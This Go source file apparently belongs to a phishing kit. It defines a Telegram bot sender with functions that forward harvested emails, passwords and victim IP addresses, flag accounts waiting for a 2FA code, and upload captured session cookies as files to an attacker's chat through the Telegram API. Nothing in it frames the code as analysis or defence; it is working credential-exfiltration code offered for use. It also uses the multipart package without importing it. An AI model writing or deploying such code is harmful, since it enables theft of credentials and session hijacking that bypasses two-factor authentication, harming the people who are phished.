package webhook

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

type TelegramSender struct {
	Token  string
	ChatID string
}

func NewSender(token, chatID string) *TelegramSender {
	return &TelegramSender{Token: token, ChatID: chatID}
}

func (t *TelegramSender) SendCredentials(source, email, password, ip string) error {
	if t.Token == "" || t.ChatID == "" {
		return nil
	}
	
	msg := fmt.Sprintf("🔐 New Submission\n\nSource: %s\nEmail: %s\nPassword: %s\nIP: %s\nTime: %s",
		source, email, password, ip, time.Now().Format("2006-01-02 15:04:05"))
	
	return t.send(msg)
}

func (t *TelegramSender) Send2FARequired(source, email, ip string) error {
	if t.Token == "" || t.ChatID == "" {
		return nil
	}
	
	msg := fmt.Sprintf("⚠️ 2FA Required\n\nSource: %s\nEmail: %s\nIP: %s\nTime: %s\nStatus: Waiting for verification code",
		source, email, ip, time.Now().Format("2006-01-02 15:04:05"))
	
	return t.send(msg)
}

func (t *TelegramSender) SendSession(source, email, cookies string) error {
	if t.Token == "" || t.ChatID == "" {
		return nil
	}
	
	msg := fmt.Sprintf("✅ Session Captured\n\nSource: %s\nEmail: %s\nTime: %s",
		source, email, time.Now().Format("2006-01-02 15:04:05"))
	
	if err := t.send(msg); err != nil {
		return err
	}
	
	return t.sendFile(fmt.Sprintf("%s_%s_session.txt", source, email), cookies)
}

func (t *TelegramSender) send(msg string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.Token)
	data, _ := json.Marshal(map[string]string{
		"chat_id": t.ChatID,
		"text":    msg,
		"parse_mode": "HTML",
	})
	
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

func (t *TelegramSender) sendFile(filename, content string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.Token)
	
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	
	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return err
	}
	
	if _, err := part.Write([]byte(content)); err != nil {
		return err
	}
	
	if err := writer.WriteField("chat_id", t.ChatID); err != nil {
		return err
	}
	
	if err := writer.WriteField("caption", filename); err != nil {
		return err
	}
	
	if err := writer.Close(); err != nil {
		return err
	}
	
	resp, err := http.Post(url, writer.FormDataContentType(), body)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}